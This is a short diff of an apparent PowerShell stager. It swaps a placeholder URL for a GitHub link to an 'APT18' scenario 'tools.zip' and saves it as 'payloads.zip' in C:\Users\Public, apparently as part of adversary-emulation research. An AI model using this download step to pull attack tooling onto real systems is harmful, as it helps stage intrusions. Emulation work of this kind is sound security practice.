@@ -1,5 +1,5 @@
 # Define the URL of the ZIP file and the local path to save it
-$url = "http://example.com/path/to/your/file.zip"
+$url = "https://github.com/alekzandr/Research/raw/main/APT18/Scenario%202/tools.zip"
 $zipPath = "C:\Users\Public\payloads.zip"
 
 # Download the ZIP file
